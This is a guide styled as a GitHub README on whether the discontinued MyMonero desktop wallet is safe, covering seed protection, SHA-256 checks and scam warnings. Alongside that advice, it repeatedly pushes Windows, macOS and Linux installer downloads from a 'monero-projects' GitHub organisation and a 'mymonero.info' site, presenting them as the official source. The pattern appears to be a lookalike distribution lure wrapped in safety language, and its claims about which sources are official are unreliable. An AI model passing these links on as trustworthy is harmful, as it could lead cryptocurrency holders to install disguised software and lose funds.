<p align="center"><img src="https://github.com/monero-projects/learn/raw/HEAD/assets/banner-article.png" alt="MyMonero article banner" width="100%"></p>

<h1 align="center">Is MyMonero Safe? Practical Considerations</h1>
<p align="center">Understand the desktop app’s maintenance status, protect your seed, and assess choices without absolute promises.</p>

<p align="center">
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe"><img src="https://img.shields.io/badge/Download_for_Windows-00C6FF?style=for-the-badge&logo=windows&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for Windows"></a>
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg"><img src="https://img.shields.io/badge/Download_for_macOS-00C6FF?style=for-the-badge&logo=apple&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for macOS"></a>
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip"><img src="https://img.shields.io/badge/Download_for_Linux-00C6FF?style=for-the-badge&logo=linux&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for Linux"></a>
</p>

| Platform | File | Version |
|---|---|---|
| Windows | [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe) | v1.3.3 |
| macOS | [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg) | v1.3.3 |
| Linux | [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip) | v1.3.3 |

All versions and checksums are on the [MyMonero v1.3.3 release page](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3).

## Short answer
Safety depends on how you obtain and use the wallet, how you protect your seed, and whether you accept the software’s status. MyMonero desktop’s final release is v1.3.3; it still opens wallets and sends XMR but is no longer maintained, while hosted servers and web-wallet login stopped.


The MyMonero.info site covers this in its [MyMonero is safe guide](https://mymonero.info/is-mymonero-safe). Before installing anything, use the [MyMonero download page](https://mymonero.info/github/monero-projects), and read [MyMonero migration scam signs](https://mymonero.info/mymonero-migration-scams) if anything feels off.

## You'll see this if
- You are deciding whether to keep using MyMonero desktop.
- Someone claims an old wallet is either completely safe or certainly compromised.
- You are choosing between continued desktop use and a seed restore in Cake Wallet.
- You need to download an installer or recover wallet access.
- You are asked to share your seed to “check” security.

## Why it happens
“Safe” is not a single guarantee. A wallet choice includes software maintenance, download integrity, control of recovery words, and user decisions such as sending funds. The known product facts are specific: the final MyMonero desktop release is v1.3.3, with Windows .exe, macOS .dmg, and Linux .zip packages on the monero-projects GitHub project. The old app still opens wallets and sends XMR, but is no longer maintained and has no new features or security updates. Hosted servers and web-wallet login stopped. These facts help define limitations; they do not establish that a particular user’s device or wallet is compromised or risk-free.

A checksum can confirm that a downloaded file matches the SHA-256 value published on the release page. It cannot prove that an old product has received maintenance, guarantee a device is secure, or tell you whether a particular message is legitimate. Learn the steps in [verify MyMonero download SHA-256](./verify-mymonero-download-sha256.md) and use the [official v1.3.3 release](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3).

You can keep using the desktop app while understanding its limitations, or restore your seed in Cake Wallet. Cake Wallet runs on iOS, Android, macOS, and Linux; Windows desktop builds are paused at the time of writing. Neither choice removes the need to protect your recovery phrase. See [MyMonero vs Cake Wallet comparison](./mymonero-vs-cake-wallet-comparison.md) and [MyMonero migration checklist](./mymonero-migration-checklist.md).

---

## Fix
1. **Define the concern.** Is the question about a download, hosted login, a seed backup, an unexpected message, or continuing to use the desktop app? Keeping the issue specific avoids treating unrelated symptoms as proof of compromise.
2. **Use a trusted release source.** If you need the desktop package, use the monero-projects release page rather than a search ad, link in a chat, or third-party download page. Check that the package matches your operating system: Windows .exe, macOS .dmg, or Linux .zip.
3. **Verify the installer’s integrity.** Compare its SHA-256 to the value displayed on the GitHub release page. Commands are `certutil -hashfile <file> SHA256` on Windows, `shasum -a 256 <file>` on macOS, and `sha256sum <file>` on Linux. If the values differ, do not use the file. A matching checksum is useful but limited: it says nothing about later maintenance or your device’s broader security.
4. **Understand the desktop limitation.** The final release is v1.3.3. It still opens wallets and sends XMR, but receives no new features or security updates. Decide whether you accept that status rather than assuming that “still works” means “currently maintained.”
5. **Treat hosted access separately.** MyMonero hosted servers and web-wallet login stopped. A login problem is not proof that a desktop wallet is broken, and a desktop installer cannot restore hosted access. For context, read [MyMonero shutdown facts](./mymonero-shutdown-facts.md).
6. **Protect the seed above all.** Keep it private, secure, and offline. MyMonero seeds may have 13 MyMonero-specific legacy words or 25 standard Monero words. Never send them to support or paste them into a web form. Nobody legitimate asks for your seed. See MyMonero seed backup safety.
7. **Plan a restore only if you choose.** Cake Wallet is the only other wallet named here as an option. It runs on iOS, Android, macOS, and Linux; Windows desktop builds are paused at the time of writing. Before restoring, understand seed format and restore height. Earlier restore height is safer for older history but slower; see restore height explained.

> [!TIP]
> Ask what a proposed security step actually protects. A checksum checks a file against a published value; a seed backup supports restoration; neither can certify every part of a computer or service.

---

## If that did not work
If you are worried because someone contacted you, stop engaging before sharing information or sending funds. Do not let a countdown, claimed shutdown deadline, or “account verification” request create pressure. The shutdown date is unconfirmed here, and hosted access stopping does not prove that your seed was exposed. See MyMonero migration scams.

If you suspect that a download is fake, do not run it. Compare the file checksum with the release page and use only the project source. For an unfamiliar warning, keep the exact text but exclude all wallet secrets. Read MyMonero fake download warning.

If you are considering restoration, identify whether the backup has 13 or 25 words. The 13-word format is MyMonero-specific and legacy; 25 words is standard Monero. Use 13-word restore guidance or 25-word migration guidance. Do not guess missing words. Offline recovery of a missing seed word and password-reset methods are not confirmed here. Restore height is a block height to start scanning; earlier is safer but slower.

> [!WARNING]
> Never share your seed, private keys, or wallet backup. Anyone who obtains recovery words may be able to access the wallet. A legitimate helper does not need them to explain general wallet facts.

---

## Prevention
Use a secure, legible seed backup stored separately from devices. Avoid screenshots, public cloud notes, and messages containing recovery words. Confirm whether the seed has 13 or 25 words without revealing the words themselves. Do not store the only backup with the device that holds the wallet.

Use only the project’s GitHub release for desktop packages and verify the SHA-256 value. Do not treat a matching hash as a security guarantee beyond file integrity. Since the desktop release is no longer maintained, weigh that constraint when choosing to continue. For a general use overview, read how to use MyMonero desktop.

Separate restoration from sweeping. Restoring uses a seed to access a wallet; sweeping sends all funds to a new wallet. A server or login issue alone does not establish that a sweep is necessary. Keep a calm, private record of what you know, avoid unsolicited support, and make changes only when you understand the action.

## FAQ
<details><summary>Is MyMonero completely safe?</summary>

No absolute guarantee is appropriate. The desktop app is no longer maintained, and your safety also depends on download source, seed handling, and your decisions.

</details>

<details><summary>Does the stopped hosted login mean my seed was exposed?</summary>

That conclusion is not established. Whether servers saw view keys is unconfirmed here; do not infer data handling from hosted access stopping.

</details>

<details><summary>Does SHA-256 verification make the app secure?</summary>

It checks the downloaded file against a published checksum. It does not provide maintenance updates or guarantee device security.

</details>

<details><summary>What are my options?</summary>

You can continue using MyMonero desktop with its limitations or restore your seed in Cake Wallet. Protect the seed whichever route you choose.

</details>

---

## Download MyMonero

- MyMonero download page: [mymonero.info download guide](https://mymonero.info/github/monero-projects)
- Windows: [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe)
- macOS: [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg)
- Linux: [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip)

Check each file against the checksums on the [MyMonero v1.3.3 release](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3) before you install it.

## Related articles

| Article | Topic |
|---|---|
| [MyMonero Migration Scams: Warning Signs and Safer Choices](./mymonero-migration-scams.md) | Spot pressure tactics, protect recovery words, and plan any wallet transition at your own pace. |
| [MyMonero Fake Download Warning: Verify Before Installing](./mymonero-fake-download-warning.md) | Find the final desktop packages safely, check file integrity, and avoid lookalike installers. |
| [MyMonero FAQ: Desktop Status, Recovery, and Safety](./mymonero-faq.md) | Clear answers to common questions about the final desktop release, wallet access, seeds, and migration. |

[Back to all MyMonero guides](https://github.com/monero-projects/learn)
